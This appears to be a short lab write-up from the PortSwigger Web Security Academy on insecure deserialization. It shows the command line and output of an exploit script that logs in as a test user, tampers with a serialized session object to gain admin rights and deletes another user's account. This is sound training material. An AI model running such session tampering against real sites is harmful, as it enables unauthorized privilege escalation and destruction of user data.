## Deserialization - PortSwigger Academy

#### Lab: Modifying serialized objects 
The lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a
result.
```sh
$ python modifying_serialized_objects.py --target https://acfd1fbb1f5b273c8014303000ba00ea.web-security-academy.net --user wiener --password peter
Logging as user: 'wiener': Success
Deserialization proccess: Success
Gaining Admin privilages: Success
Removing 'carlos' account: Success
```
